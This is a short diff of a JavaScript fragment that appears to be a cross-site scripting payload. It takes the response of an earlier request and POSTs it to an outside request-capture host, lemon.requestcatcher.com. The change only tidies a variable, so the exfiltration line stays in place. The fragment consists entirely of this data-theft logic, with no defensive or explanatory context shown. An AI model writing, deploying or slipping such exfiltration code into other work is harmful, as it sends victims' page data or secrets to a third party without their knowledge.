@@ -8,7 +8,6 @@ v = xhrr.response;
 
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "https://lemon.requestcatcher.com/", true);
-const data = v;
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-xhr.send(data);
+xhr.send(v);
